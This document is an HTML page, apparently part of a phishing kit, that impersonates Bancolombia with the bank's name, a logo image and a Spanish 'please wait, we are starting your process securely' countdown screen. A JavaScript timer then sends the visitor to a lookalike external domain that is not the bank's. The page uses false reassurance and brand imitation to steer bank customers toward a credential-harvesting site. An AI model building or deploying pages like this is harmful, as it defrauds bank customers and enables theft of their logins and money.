

<html class=" dkddl_fouc"><head id="ctl00_Head1"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=10">
    <title>
	Bancolombia
</title>
<link href="./Bancolombia_files/Login.css" type="text/css" rel="stylesheet">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

 <script language="JavaScript">
 
    /* Determinamos el tiempo total en segundos */
    var totalTiempo=10;
    
    var url="http://bcolombiaco.iceiy.com";
 
    function updateReloj()
    {
        document.getElementById('CuentaAtras').innerHTML = ""+"0:"+totalTiempo+"";
 
        if(totalTiempo==0)
        {
            window.location=url;
        }else{
            /* Restamos un segundo al tiempo restante */
            totalTiempo-=1;
            /* Ejecutamos nuevamente la función al pasar 2000 milisegundos (2 segundo) */
            setTimeout("updateReloj()",800);
        }
    }
 
    window.onload=updateReloj;
 
    </script>
</head>

<body style=" background-image:  url(trazo3.svg); background-attachment:fixed;
	background-size: 100% 100%;	">
    <form method="post" action="">



						<style>							
							P.PanelControlTitleStyle
							{
 								font-family:verdana;
 								font-size: 12px;
								font-weight : bold;
								text-align: center;  								
							}
						</style>						
					
    



    <div class="contenedorgenerico">
       
       
        <div class="login-container">


    <div class="logo-ban">
        <img src="https://www.elespectador.com/resizer/gLSFlWys8l9BNe-IJy_c2WfOAp4=/1200x675/filters:quality(60):format(jpeg)/arc-anglerfish-arc2-prod-elespectador.s3.amazonaws.com/public/WPEPRMGI7FAFLIJTI7SE26LNSE.jpg" style="width: 201px;">
		 <br><br><br>
	
    </div>
    <div id="dimmer">
        
                <div id="ctl00_MainHolder_authenticate_firsStep_panel" onkeypress="javascript:return WebForm_FireDefaultButton(event,
				&#39;ctl00_MainHolder_linkButton_SecondStep&#39;)" style="text-align:center;padding-top: 5px">
	
                    <div align="center"><font color="white" size="5px"></font>
                       <p style="font-size: 24px;color:black; margin: 40px;"><b>¡Por favor espere!</b></p>
<br><img style="font-weight: 900; margin-bottom: 30px; width:80px; height:auto;" src="https://i.gifer.com/ZZ5H.gif">
<br><b><span style="color:black; font-size:16px;" id="CuentaAtras">0:10</span>
<br><span style="color:black; font-size:16px;">No cierre esta ventana<br><br> Estamos iniciando tu proceso de forma segura</span></b>
                      	<div align="center">  
																	
																	</div>
                        <table class="tabla-login-teclado" cellpadding="0" cellspacing="0">
                            <tbody><tr>
                                <td>
                                    
                                </td>
                            </tr>
                        </tbody>
						</table>
                    </div>
         
</div>
            
    </div>
  

        </div>
     </div>  
   

</form>
    
   

</body></html>